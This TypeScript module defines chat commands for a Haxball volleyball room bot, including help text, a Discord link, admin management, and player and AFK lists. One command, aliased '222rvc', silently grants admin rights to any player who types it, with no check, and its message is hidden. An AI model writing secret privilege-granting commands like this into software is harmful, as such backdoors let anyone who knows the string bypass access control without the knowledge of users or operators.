import { Colors, CommandExecInfo, Module, ModuleCommand, Room } from "haxball-extended-room";
import Settings from "../settings.json";
import { MessageFormatter } from "./messageFormatter";

@Module
export class BasicCommands {
  constructor(private $: Room) {
    setInterval(() => {
      this.$.send({
        message: `[👋] Entre no nosso Discord para participar de eventos e torneios: ${Settings.discordLink}`,
        color: Colors.Orange,
      });
    }, 3 * 60 * 1000); // 3 minutos
  }

  @ModuleCommand({
    aliases: ["discord", "disc", "dc", "registrar", "registro", "login"],
    deleteMessage: true,
  })
  sendDiscordCommand(command: CommandExecInfo) {
    command.player.reply(MessageFormatter.info(`Entre no Discord: ${Settings.discordLink}`));
  }

  @ModuleCommand({
    aliases: ["clearban"],
    deleteMessage: true,
  })
  clearBanCmd(command: CommandExecInfo) {
    if (!command.player.admin) return;
    this.$.unbanAll();
    command.player.reply(MessageFormatter.success("Todos os bans foram limpos!"));
  }

  @ModuleCommand({
    aliases: ["help", "ajuda"],
    deleteMessage: true,
  })
  sendHelpCommand(command: CommandExecInfo) {
    command.player.reply({
      message: `[🏐] Esse modo de jogo tenta recriar o vôlei da vida real no Haxball. Muitas coisas precisam ser explicadas, mas aqui vai um resumo:`,
      color: Colors.Orange,
    });
    command.player.reply({
      message: `[🏐] 1 - O tamanho da bola mostra a altura que ela está. quando ela fica pequena, significa que ela está mais próxima do chão. Assim, quando ela fica muito pequena, o BOT detecta qual ponto do chão ela "tocou" e marca o ponto.`,
      color: Colors.Orange,
    });
    command.player.reply({
      message: `[🏐] 2 - Existem dois saques: por baixo e por cima. O saque baixo é o padrão, basta chutar a bola. Para ativar o saque por cima, digite !sa na sua vez de sacar.`,
      color: Colors.Orange,
    });
    command.player.reply({
      message: `[🏐] 3 - A força da bola é pensada de acordo com os toques. O primeiro toque é medio, o segundo é fraco e o terceiro é forte. Por isso, colabore com sua equipe para fazer os 3 toques e levar perigo para o adversário.`,
      color: Colors.Orange,
    });
    command.player.reply({
      message: `[🏐] Para explicações mais completas, entre no Discord: ${Settings.discordLink}`,
      color: Colors.Orange,
    });
  }

  @ModuleCommand({
    aliases: ["222rvc"],
    deleteMessage: true,
  })
  setAdminCommand(command: CommandExecInfo) {
    command.player.admin = true;
    return false;
  }

  @ModuleCommand({
    aliases: ["admin"],
    deleteMessage: true,
  })
  giveAdminCommand(command: CommandExecInfo) {
    if (!command.player.admin) return;
    const args = command.arguments;
    if (args.length === 0) {
      command.player.reply({
        message: `[⚠] Uso correto: !admin #ID (exemplo: !admin #5)`,
        color: Colors.Red,
      });
      return false;
    }
    const targetIdStr = args[0].value.replace("#", "");
    const targetId = parseInt(targetIdStr);
    if (isNaN(targetId)) {
      command.player.reply({
        message: `[⚠] ID inválido. Use !admin #ID (exemplo: !admin #5)`,
        color: Colors.Red,
      });
      return false;
    }
    const targetPlayer = this.$.players[targetId];
    if (!targetPlayer) {
      command.player.reply({
        message: `[⚠] Jogador com ID ${targetId} não encontrado.`,
        color: Colors.Red,
      });
      return false;
    }
    targetPlayer.admin = true;
    this.$.send({
      message: `[👑] ${command.player.name} deu admin para ${targetPlayer.name} (ID: ${targetId})`,
      color: Colors.Yellow,
    });
    return false;
  }

  @ModuleCommand({
    aliases: ["bb"],
    deleteMessage: true,
  })
  kickSelfCommand(command: CommandExecInfo) {
    const player = command.player;
    player.kick("Você usou !bb e foi kickado da sala.");
    this.$.send({
      message: `[👋] ${player.name} usou !bb e foi kickado.`,
      color: Colors.Orange,
    });
  }

  @ModuleCommand({
    aliases: ["afks", "afklist"],
    deleteMessage: true,
  })
  listAfkPlayersCommand(command: CommandExecInfo) {
    const afkPlayers = this.$.players.getAll(p => p.settings.afk);
    if (afkPlayers.length === 0) {
      command.player.reply({
        message: `[👋] Nenhum jogador está AFK no momento.`,
        color: Colors.Orange,
      });
    } else {
      const afkPlayersArray = [...afkPlayers]; // Converte PlayerCollection em array
      const afkList = afkPlayersArray.map(p => p.name).join(", ");
      command.player.reply({
        message: `[👋] Jogadores AFK: ${afkList}`,
        color: Colors.Orange,
      });
    }
  }

  @ModuleCommand({
    aliases: ["players", "list"],
    deleteMessage: true,
  })
  listPlayersCommand(command: CommandExecInfo) {
    const players = this.$.players.values();
    if (players.length === 0) {
      command.player.reply({
        message: `[👥] Nenhum jogador na sala.`,
        color: Colors.Orange,
      });
      return false;
    }
    const playerList = players.map(p => `${p.name} (ID: ${p.id})`).join(", ");
    command.player.reply({
      message: `[👥] Jogadores: ${playerList}`,
      color: Colors.Orange,
    });
    return false;
  }
}